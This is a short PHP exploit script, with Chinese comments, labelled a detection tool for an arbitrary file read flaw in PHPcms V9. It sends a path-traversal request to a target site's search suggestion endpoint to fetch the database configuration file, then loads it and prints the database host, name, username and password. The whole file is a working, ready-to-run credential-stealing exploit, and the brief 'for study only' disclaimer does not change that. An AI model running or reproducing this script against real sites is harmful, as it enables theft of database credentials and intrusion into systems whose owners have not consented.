<?php
/**
 * PHPcms V9 任意文件读取漏洞检测工具
 * @author  Return Blog: www.creturn.com
 * Email: master@creturn.com
 *  
 * 注意本程序仅供学习参考，不得用于非法互动
 * 否则后果自负，与本人无关！
 */
 

function showInfo() {
	
print '
***********************************************
* PHPcmsV9 Read All File ExpTool By: Return  
*
* Blog: www.creturn.com
* 
* Email:master@creturn.com
* 
* Example: php exp.php wwww.phpcms.cn
***********************************************
';
}

$exp = '/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../caches/configs/database.php';

//file_get_contents(''.$exp);
if(count($argv) < 2){
	showInfo();
}else{
	
	$exp = 'http://'.$argv[1].$exp;
	$data =  @file_get_contents($exp);
	@file_put_contents('expDatabase.php', $data);
	if(strstr($data,'<html>')){
		showInfo();
		echo 'Not found !';
		exit();
	};
	$database = include 'expDatabase.php';
	showInfo();
	$out = 'HostName: '.$database['default']['hostname']."\n";
	$out .='DataBase:'. $database['default']['database']."\n";
	$out .='UserName:'. $database['default']['username']."\n";
	$out .='Password:'. $database['default']['password']."\n";
	if(!empty($database)){
		echo "Found it! :\n\n"; 
		echo $out;
	}
	@unlink('expDatabase.php');
}